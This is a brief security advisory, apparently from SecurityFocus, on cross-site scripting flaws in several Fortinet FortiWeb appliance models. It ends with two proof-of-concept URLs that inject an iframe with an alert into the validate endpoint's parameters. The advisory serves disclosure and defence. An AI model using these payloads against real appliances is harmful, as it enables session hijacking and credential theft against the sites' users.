source: https://www.securityfocus.com/bid/56774/info

Multiple Fortinet FortiWeb Appliances are prone to multiple cross-site scripting vulnerabilities because they fail to properly sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

The following FortiWeb application series are vulnerable:

FortiWeb-4000C
FortiWeb-3000C/3000CFsx
FortiWeb-1000C
FortiWeb-400C and
FortiWeb Virtual Appliance 

https://www.example.com/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C

https://www.example.com/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0